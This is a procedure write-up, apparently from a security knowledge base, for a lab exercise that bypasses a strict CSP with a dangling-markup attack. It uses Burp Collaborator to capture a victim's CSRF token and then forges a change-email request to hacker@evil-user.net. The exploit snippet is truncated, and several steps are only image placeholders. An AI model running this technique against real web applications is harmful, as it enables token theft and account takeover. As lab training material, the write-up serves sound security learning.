---
id: 47cbae7b-a063-4fbc-a9a1-b22ccf39c161
name: Reflected XSS Protected By Very Strict CSP(Dangling Markup Attack)
type: procedure
verified: true
submitted: true
created_at: '2020-08-25T10:08:59.220450+00:00'
updated_at: '2023-05-26T18:39:47.753914+00:00'
platforms:
- Web
tags:
- '[[CSRF]]'
- '[[Reflected XSS]]'
- '[[Web Applications]]'
---

# Reflected XSS Protected By Very Strict CSP(Dangling Markup Attack)

**Status**: ✓ Verified

## Summary

Very Strict implementation of CSP will block the requests to the external websites. An attacker will bypass this implementation by using burp collaborator to get the resp[onse from victim. 

## Description

# Description

Very Strict implementation of CSP will block the requests to the external websites. An attacker will bypass this implementation by using burp collaborator to get the resp[onse from victim.





# Instructions





1. Login to the application with credentials provided 





![1423bc87-6263-4995-bb05-918ad33c701e.png]()









2. From *Burp Suite professional* , launch burp collaborator 







![5cfd172e-f761-4ab1-b72c-1c19bc06e677.png]()







3.Clcik on *copy to clipboard* to copy the unique collaborator url.







![e441ff52-9575-40f9-9374-aadf5c778394.png]()





4.Use the followind JS code to create a malicious exploit which will exploit the XSS vulnerablity . Replace the src with collaborator url from above step.









**Code**: [[<script>
if(window.name) {
    new Image().src=']]





Copy the code to the exploit server and generate a exploit url. Deliver the exploit to the victim. When the logged in victim clicks on the exploit url , the victim's browser will send the CSRF token to the attacker's server.



![d10305af-6fbf-4c0d-8928-5c006bd56cd3.png]()



5. From burp collaborator window , click on* poll now* to generate responses from the application server.copy the CSRF token from the request tab.







![2a24e7b9-144d-423d-857c-b4a35112150c.png]()





6. From the application's page, access the *change email* and intercept the request using burp.







![1cf4f40c-3983-41b1-a751-5c8985bff691.png]()







7.Change the email from the intercepted request to *hacker@evil-user.net*





![52945c6f-42e0-4148-b6fe-87985cb7e165.png]()





8. Right click on the application and select *CSRF PoC generator* from enagagement tools to launch *CSRF Poc Generator* to create a CSRF form for the *change email* request.







![c43371df-ba2c-445b-88ab-a3aaebc53809.png]()





9.Make sure to check on *include auto-submit script *







![3565dc70-3b4c-4872-b793-9019f2483d81.png]()





10.Click on regenerate from the above step. Observe that a CSRF HTML form is generated . Copy the HTML from.





![0332f630-cc7b-4800-887c-c9b5703e238a.png]()





11. Replace the JS code in step 4 with the HTML form from the above step  and create a exploit . Deliver the exploit to the victim. When the victim access the 







![2bd3c167-03d9-47ca-903b-43c25aea6525.png]()



## Platforms

- Web

## Tags

- [[CSRF]]
- [[Reflected XSS]]
- [[Web Applications]]


